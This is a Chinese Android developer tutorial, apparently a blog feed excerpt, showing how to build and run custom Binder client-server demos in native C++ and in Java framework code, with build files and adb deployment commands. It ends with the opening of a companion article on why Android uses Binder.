<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"IMyService.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    sp &lt; IServiceManager &gt; sm = defaultServiceManager(); <span class="comment">//获取service manager引用</span></div><div class="line">    sp &lt; IBinder &gt; binder = sm-&gt;getService(String16(<span class="string">"service.myservice"</span>));<span class="comment">//获取名为"service.myservice"的binder接口</span></div><div class="line">    sp&lt;IMyService&gt; cs = interface_cast &lt; IMyService &gt; (binder);<span class="comment">//将biner对象转换为强引用类型的IMyService</span></div><div class="line">    cs-&gt;sayHello();<span class="comment">//利用binder引用调用远程sayHello()方法</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1-3-MyService"><a href="#1-3-MyService" class="headerlink" title="1.3 MyService"></a>1.3 MyService</h2><blockquote>
<p>alps/frameworks/native/cmds/NativeBinderDemo/IMyService.h</p>
</blockquote>
<p>申明IMyService，申明BpMyService（Binder客户端），申明BnMyService（Binder的服务端）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MY_SERVICE_DEMO</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_SERVICE_DEMO</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/IInterface.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/Parcel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/IBinder.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/Binder.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/ProcessState.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/IPCThreadState.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;binder/IServiceManager.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> android;</div><div class="line"><span class="keyword">namespace</span> android</div><div class="line">&#123;</div><div class="line">    <span class="keyword">class</span> IMyService : <span class="keyword">public</span> IInterface</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        DECLARE_META_INTERFACE(MyService); <span class="comment">//使用宏，申明MyService</span></div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>=<span class="number">0</span>; <span class="comment">//定义方法</span></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">        <span class="comment">//定义命令字段</span></div><div class="line">    <span class="keyword">enum</span></div><div class="line">    &#123;</div><div class="line">        HELLO = <span class="number">1</span>,</div><div class="line">    &#125;;</div><div class="line">    </div><div class="line">        <span class="comment">//申明客户端BpMyService</span></div><div class="line">    <span class="keyword">class</span> BpMyService: <span class="keyword">public</span> BpInterface&lt;IMyService&gt; &#123;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        BpMyService(<span class="keyword">const</span> sp&lt;IBinder&gt;&amp; impl);</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">        <span class="comment">//申明服务端BnMyService</span></div><div class="line">        <span class="keyword">class</span> BnMyService: <span class="keyword">public</span> BnInterface&lt;IMyService&gt; &#123;</div><div class="line">        <span class="keyword">public</span>:</div><div class="line">            <span class="function"><span class="keyword">virtual</span> status_t <span class="title">onTransact</span><span class="params">(<span class="keyword">uint32_t</span> code, <span class="keyword">const</span> Parcel&amp; data, Parcel* reply,</span></span></div><div class="line">                    <span class="keyword">uint32_t</span> flags = <span class="number">0</span>);</div><div class="line">            <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>;</div><div class="line">        &#125;;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<blockquote>
<p>alps/frameworks/native/cmds/NativeBinderDemo/IMyService.cpp</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"IMyService.h"</span></span></div><div class="line"><span class="keyword">namespace</span> android</div><div class="line">&#123;</div><div class="line">    IMPLEMENT_META_INTERFACE(MyService, <span class="string">"android.demo.IMyService"</span>); <span class="comment">//使用宏，完成MyService定义</span></div><div class="line">   </div><div class="line">  <span class="comment">//客户端</span></div><div class="line">    BpMyService::BpMyService(<span class="keyword">const</span> sp&lt;IBinder&gt;&amp; impl) :</div><div class="line">            BpInterface&lt;IMyService&gt;(impl) &#123;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// 实现客户端sayHello方法</span></div><div class="line">    <span class="keyword">void</span> BpMyService::sayHello() &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"BpMyService::sayHello\n"</span>);</div><div class="line">        Parcel data, reply;</div><div class="line">        data.writeInterfaceToken(IMyService::getInterfaceDescriptor());</div><div class="line">        remote()-&gt;transact(HELLO, data, &amp;reply);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"get num from BnMyService: %d\n"</span>, reply.readInt32());</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//服务端，接收远程消息，处理onTransact方法</span></div><div class="line">    <span class="keyword">status_t</span> BnMyService::onTransact(<span class="keyword">uint_t</span> code, <span class="keyword">const</span> Parcel&amp; data,</div><div class="line">            Parcel* reply, <span class="keyword">uint32_t</span> flags) &#123;</div><div class="line">        <span class="keyword">switch</span> (code) &#123;</div><div class="line">        <span class="keyword">case</span> HELLO: &#123;    <span class="comment">//收到HELLO命令的处理流程</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"BnMyService:: got the client hello\n"</span>);</div><div class="line">            CHECK_INTERFACE(IMyService, data, reply);</div><div class="line">            sayHello();</div><div class="line">            reply-&gt;writeInt32(<span class="number">2015</span>);</div><div class="line">            <span class="keyword">return</span> NO_ERROR;</div><div class="line">        &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> NO_ERROR;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// 实现服务端sayHello方法</span></div><div class="line">    <span class="keyword">void</span> BnMyService::sayHello() &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"BnMyService::sayHello\n"</span>);</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1-4-Android-mk"><a href="#1-4-Android-mk" class="headerlink" title="1.4 Android.mk"></a>1.4 Android.mk</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line"> </div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_SHARED_LIBRARIES := \</div><div class="line">    libcutils \</div><div class="line">    libutils \</div><div class="line">    libbinder       </div><div class="line">LOCAL_MODULE    := ServerDemo</div><div class="line">LOCAL_SRC_FILES := \</div><div class="line">    IMyService.cpp \</div><div class="line">    ServerDemo.cpp</div><div class="line">   </div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">include $(BUILD_EXECUTABLE)</div><div class="line">  </div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_SHARED_LIBRARIES := \</div><div class="line">    libcutils \</div><div class="line">    libutils \</div><div class="line">    libbinder</div><div class="line">LOCAL_MODULE    := ClientDemo</div><div class="line">LOCAL_SRC_FILES := \</div><div class="line">    IMyService.cpp \</div><div class="line">    ClientDemo.cpp</div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">include $(BUILD_EXECUTABLE)</div></pre></td></tr></table></figure>
<h2 id="1-5-原理图"><a href="#1-5-原理图" class="headerlink" title="1.5 原理图"></a>1.5 原理图</h2><p><img src="/img/archives/native_binder_demo.jpg" alt="native_binder_demo.jpg"></p>
<h2 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h2><p><strong>编译：</strong><br>mm alps/frameworks/native/cmds/NativeBinderDemo目录，然后到alps/out/target/product/{Project}/system/bin/会生成<code>ClientDemo</code>和<code>ServerDemo</code></p>
<p><strong>执行：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">adb remount</div><div class="line">adb push ServerDemo /system/bin</div><div class="line">adb push ClientDemo /system/bin</div></pre></td></tr></table></figure></p>
<p>开两个窗口分别执行下面两个命令便可以看到结果了：<br><code>adb shell system/bin/ServerDemo</code> ， <code>adb shell system/bin/ClientDemo</code></p>
<h1 id="二、JavaFramework-Binder"><a href="#二、JavaFramework-Binder" class="headerlink" title="二、JavaFramework Binder"></a>二、JavaFramework Binder</h1><p>源码目录结构:</p>
<blockquote>
<p>alps/frameworks/base/cmds/FrameworkBinderDemo/</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">|-Server端</div><div class="line">|---ServerDemo.java：可执行程序</div><div class="line">|---IMyService.java: 定义IMyService接口</div><div class="line">|---MyService.java：定义MyService</div><div class="line">|-Client端</div><div class="line">|---ClientDemo.java：可执行程序</div><div class="line">|---IMyService.java: 与Server端完全一致</div><div class="line">|---MyServiceProxy.java：定义MyServiceProxy</div></pre></td></tr></table></figure>
<h2 id="2-1-Server端"><a href="#2-1-Server端" class="headerlink" title="2.1 Server端"></a>2.1 Server端</h2><p><strong>(1)ServerDemo.java</strong></p>
<p>可执行程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerDemo</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"MyService Start"</span>);</div><div class="line">        <span class="comment">//准备Looper循环执行</span></div><div class="line">        Looper.prepareMainLooper();</div><div class="line">        <span class="comment">//设置为前台优先级</span></div><div class="line">        android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_FOREGROUND);</div><div class="line">        <span class="comment">//注册服务</span></div><div class="line">        ServiceManager.addService(<span class="string">"MyService"</span>, <span class="keyword">new</span> MyService());</div><div class="line">        Looper.loop();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>(2)IMyService.java</strong></p>
<p>定义sayHello()方法，DESCRIPTOR属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMyService</span> <span class="keyword">extends</span> <span class="title">IInterface</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String DESCRIPTOR = <span class="string">"com.yuanhh.frameworkBinder.MyServer"</span>;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String str)</span> <span class="keyword">throws</span> RemoteException </span>;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TRANSACTION_say = android.os.IBinder.FIRST_CALL_TRANSACTION;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>(3)MyService.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Binder</span> <span class="keyword">implements</span> <span class="title">IMyService</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.attachInterface(<span class="keyword">this</span>, DESCRIPTOR);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">asBinder</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/** 将MyService转换为IMyService接口 **/</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> com.yuanhh.frameworkBinder.<span class="function">IMyService <span class="title">asInterface</span><span class="params">(</span></span></div><div class="line">            android.os.IBinder obj) &#123;</div><div class="line">        <span class="keyword">if</span> ((obj == <span class="keyword">null</span>)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        android.os.IInterface iInterface = obj.queryLocalInterface(DESCRIPTOR);</div><div class="line">        <span class="keyword">if</span> (((iInterface != <span class="keyword">null</span>)&amp;&amp;(iInterface <span class="keyword">instanceof</span> com.yuanhh.frameworkBinder.IMyService)))&#123;</div><div class="line">            <span class="keyword">return</span> ((com.yuanhh.frameworkBinder.IMyService) iInterface);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**  服务端，接收远程消息，处理onTransact方法  **/</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">onTransact</span><span class="params">(<span class="keyword">int</span> code, Parcel data, Parcel reply, <span class="keyword">int</span> flags)</span></span></div><div class="line">            <span class="keyword">throws</span> RemoteException &#123;</div><div class="line">        <span class="keyword">switch</span> (code) &#123;</div><div class="line">        <span class="keyword">case</span> INTERFACE_TRANSACTION: &#123;</div><div class="line">            reply.writeString(DESCRIPTOR);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">case</span> TRANSACTION_say: &#123;</div><div class="line">            data.enforceInterface(DESCRIPTOR);</div><div class="line">            String str = data.readString();</div><div class="line">            sayHello(str);</div><div class="line">            reply.writeNoException();</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;&#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onTransact(code, data, reply, flags);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/** 自定义sayHello()方法   **/</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String str)</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"MyService:: Hello, "</span> + str);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>(4) Android.mk</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH:= $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line"></div><div class="line">LOCAL_SRC_FILES := $(call all-subdir-java-files)</div><div class="line">LOCAL_MODULE := ServerDemo </div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">include $(BUILD_JAVA_LIBRARY)</div><div class="line"></div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := ServerDemo</div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">LOCAL_MODULE_PATH := $(TARGET_OUT)/bin</div><div class="line">LOCAL_MODULE_CLASS := UTILITY_EXECUTABLES</div><div class="line">LOCAL_SRC_FILES := ServerDemo</div><div class="line">include $(BUILD_PREBUILT)</div></pre></td></tr></table></figure>
<p><strong>(5) ServerDemo</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">base=/system</div><div class="line">export CLASSPATH=$base/framework/ServerDemo.jar</div><div class="line">exec app_process $base/bin com.shun.frameworkBinder.ServerDemo &quot;$@&quot;</div></pre></td></tr></table></figure>
<h2 id="2-2-Client端"><a href="#2-2-Client端" class="headerlink" title="2.2 Client端"></a>2.2 Client端</h2><p><strong>(1)ClientDemo.java</strong></p>
<p>可执行程序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</div><div class="line">        System.out.println(<span class="string">"Client start"</span>);</div><div class="line">        IBinder binder = ServiceManager.getService(<span class="string">"MyService"</span>); <span class="comment">//获取名为"MyService"的服务</span></div><div class="line">        IMyService myService = <span class="keyword">new</span> MyServiceProxy(binder); <span class="comment">//创建MyServiceProxy对象</span></div><div class="line">        myService.sayHello(<span class="string">"binder"</span>); <span class="comment">//通过MyServiceProxy对象调用接口的方法</span></div><div class="line">        System.out.println(<span class="string">"Client end"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>(2)IMyService.java</strong></p>
<p>与Server端的IMyService是一致，基本都是拷贝一份过来。</p>
<p><strong>(3)MyServiceProxy.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyServiceProxy</span> <span class="keyword">implements</span> <span class="title">IMyService</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> android.os.IBinder mRemote;  <span class="comment">//代表BpBinder</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyServiceProxy</span><span class="params">(android.os.IBinder remote)</span> </span>&#123;</div><div class="line">        mRemote = remote;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> java.lang.<span class="function">String <span class="title">getInterfaceDescriptor</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> DESCRIPTOR;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/** 自定义的sayHello()方法   **/</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String str)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</div><div class="line">        android.os.Parcel _data = android.os.Parcel.obtain();</div><div class="line">        android.os.Parcel _reply = android.os.Parcel.obtain();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            _data.writeInterfaceToken(DESCRIPTOR);</div><div class="line">            _data.writeString(str);</div><div class="line">            mRemote.transact(TRANSACTION_say, _data, _reply, <span class="number">0</span>);</div><div class="line">            _reply.readException();</div><div class="line">        &#125; <span class="keyword">finally</span> &#123;</div><div class="line">            _reply.recycle();</div><div class="line">            _data.recycle();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">asBinder</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> mRemote;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong> (4) Android.mk</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH:= $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line"></div><div class="line">LOCAL_SRC_FILES := $(call all-subdir-java-files)</div><div class="line">LOCAL_MODULE := ClientDemo </div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">include $(BUILD_JAVA_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := ClientDemo</div><div class="line">LOCAL_MODULE_TAGS := optional</div><div class="line">LOCAL_MODULE_PATH := $(TARGET_OUT)/bin</div><div class="line">LOCAL_MODULE_CLASS := UTILITY_EXECUTABLES</div><div class="line">LOCAL_SRC_FILES := ClientDemo</div><div class="line">include $(BUILD_PREBUILT)</div></pre></td></tr></table></figure>
<p><strong> (5) ClientDemo </strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">base=/system</div><div class="line">export CLASSPATH=$base/framework/ClientDemo.jar</div><div class="line">exec app_process $base/bin com.shun.frameworkBinder.ClientDemo &quot;$@&quot;</div></pre></td></tr></table></figure>
<h2 id="2-3-原理图"><a href="#2-3-原理图" class="headerlink" title="2.3 原理图"></a>2.3 原理图</h2><p><img src="/img/archives/MyServer_framework_binder.jpg" alt="MyServer_framework_binder.jpg"></p>
<h2 id="2-4-运行"><a href="#2-4-运行" class="headerlink" title="2.4 运行"></a>2.4 运行</h2><p><strong>编译：</strong></p>
<p>mm alps/frameworks/base/cmds/FrameworkBinderDemo/目录，然后：<br>alps/out/target/product/{Project}/system/bin/        生成ClientDemo和ServerDemo<br>alps/out/target/product/{Project}/system/framework/  生成ClientDemo.jar和ServerDemo.jar。</p>
<p><strong>执行：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">adb remount</div><div class="line">adb push ServerDemo /system/bin</div><div class="line">adb push ClientDemo /system/bin</div><div class="line">adb push ServerDemo.jar /system/framework/</div><div class="line">adb push ClientDemo.jar /system/framework/</div></pre></td></tr></table></figure>
<p>开两个窗口分别执行下面两个命令便可以看到结果了：<br>adb shell system/bin/ServerDemo ， adb shell system/bin/ClientDemo</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章的内容主要说明如何在JavaFramework层和Native层自定义Client-Server组件，并且使用Binder进行通信。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Binder" scheme="https://maoao530.github.io/tags/Binder/"/>
    
  </entry>
  
  <entry>
    <title>Binder实用指南（一） - 理解篇</title>
    <link href="https://maoao530.github.io/2016/12/21/android-binder-01/"/>
    <id>https://maoao530.github.io/2016/12/21/android-binder-01/</id>
    <published>2016-12-21T13:29:35.000Z</published>
    <updated>2017-01-31T05:47:36.553Z</updated>
    
    <content type="html"><![CDATA[<p>这是关于Android Binder机制的一篇文章，Binder是Android里面非常重要的组成，也是最难理解的一块知识点，学习Binder最好的方法是深入源码阅读，因为Binder相关的知识错综复杂，一般初学者也很容易迷失在源码的汪洋里，本文旨在梳理Binder的架构和流程，并且试着以实用的角度来看待Binder。</p>
<a id="more"></a>
<h1 id="一、为什么需要Binder机制？"><a href="#一、为什么需要Binder机制？" class="headerlink" title="一、为什么需要Binder机制？"></a>一、为什么需要Binder机制？</h1><p>Android系统中，每个应用程序是由Android的Activity，Service，Broadcast，ContentProvider这四剑客的中一个或多个组合而成，这四剑客所涉及的多进程间的通信底层都是依赖于Binder IPC机制。例如当进程A中的Activity要向进程B中的Service通信，这便需要依赖于Binder IPC。<br>如果熟悉Android源码，其实可以知道整个Android系统架构中，也大量采用了Binder机制作为IPC（进程间通信）方案。<br>Android是在Linux内核的基础上设计的。而在Linux中，已经拥有”管道/消息队列/共享内存/信号量/Socket等等”众多的IPC通信手段；但是，Google为什么单单选择了Binder，可见Binder肯定有自己独特的优势：</p>
